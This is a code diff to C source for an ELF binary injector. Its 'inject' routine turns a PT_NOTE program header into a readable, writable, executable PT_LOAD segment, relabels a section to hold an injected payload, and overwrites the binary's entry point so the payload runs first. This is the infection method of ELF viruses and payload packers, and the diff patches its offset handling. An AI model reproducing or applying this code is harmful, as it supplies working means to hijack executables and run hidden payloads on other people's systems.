@@ -15,8 +15,9 @@ int FORCE_INLINE metamorph_segment(t_data data)
 		if (p_hdr.p_type == PT_NOTE)
 		{
 			p_hdr.p_type = PT_LOAD;
-			p_hdr.p_offset = data.bin.new_entry - data.bin.v_addr;
+			p_hdr.p_offset = data.bin.new_pentry;
 			p_hdr.p_vaddr = data.bin.new_entry;
+			p_hdr.p_paddr = data.bin.new_pentry;
 			p_hdr.p_filesz = data.infos.pl_size;
 			p_hdr.p_memsz = data.infos.pl_size;
 			p_hdr.p_flags = PF_X | PF_R | PF_W;
@@ -46,9 +47,10 @@ int FORCE_INLINE metamorph_section(t_data data)
 			s_hdr.sh_type = SHT_PROGBITS;
 			s_hdr.sh_flags = SHF_EXECINSTR | SHF_ALLOC;
 			s_hdr.sh_addr = data.bin.new_entry;
-			s_hdr.sh_offset = data.bin.new_entry - data.bin.v_addr;
+			s_hdr.sh_offset = data.bin.new_pentry;
 			s_hdr.sh_link = 0;
 			s_hdr.sh_info = 0;
+			s_hdr.sh_size = data.infos.pl_size;
 			s_hdr.sh_addralign = 0;
 			s_hdr.sh_entsize= 0;
 			LSEEK(data.fd, sizeof(s_hdr) * -1, SEEK_CUR);
@@ -84,6 +86,7 @@ int inject(t_data data)
 	if (!metamorph_segment(data) || !metamorph_section(data))
 		return (0);
 	/* change entry point */
+	printf("ie: %d\n", data.bin.new_entry);
 	LSEEK(data.fd, 24, SEEK_SET);
 	WRITE(data.fd, &(data.bin.new_entry), sizeof(data.bin.new_entry));
 	offset = LSEEK(data.fd, 0, SEEK_END);
